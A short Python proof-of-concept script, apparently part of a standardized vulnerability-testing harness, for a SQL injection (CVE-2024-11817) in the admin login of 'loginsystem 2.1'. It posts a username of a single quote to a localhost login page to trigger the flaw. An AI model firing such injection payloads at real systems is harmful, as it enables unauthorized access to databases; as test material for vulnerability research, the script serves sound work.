#!/usr/bin/env python3
"""
[APP] loginsystem
[CVE] 2024-11817
[TYPE] SQL injection
[METHOD] POST
[CRASH_FIELDS] username
[TARGET_URL] http://localhost/login/admin/index.php
[PARAMS] username=1'&password=1&login=submit
loginsystem 2.1 SQL injection vulnerability in admin login
POST request to /login/admin/index.php with malicious username and password parameters
No authentication required
"""

import sys
import os

# Import standardized POC utilities
from utils import *

def main():
    # Extract metadata from this file's docstring
    metadata = get_poc_metadata_from_file(__file__)
    
    # Loginsystem SQL injection configuration
    poc_url = 'http://localhost/login/admin/index.php'
    
    # SQL injection payload
    poc_data = {
        'username': "1'",  # SQL injection payload
        'password': "1",
        'login': 'submit'
    }
    
    # Create POC runner
    poc_runner = create_standard_poc_runner(
        cve_id=metadata['cve'],
        app_name=metadata['app'],
        vuln_type=metadata['type']
    )
    
    # Run POC test (no authentication required)
    exit_code = poc_runner.run_test(
        url=poc_url,
        method=metadata['method'],
        data=poc_data
    )
    
    sys.exit(exit_code)

if __name__ == '__main__':
    main()
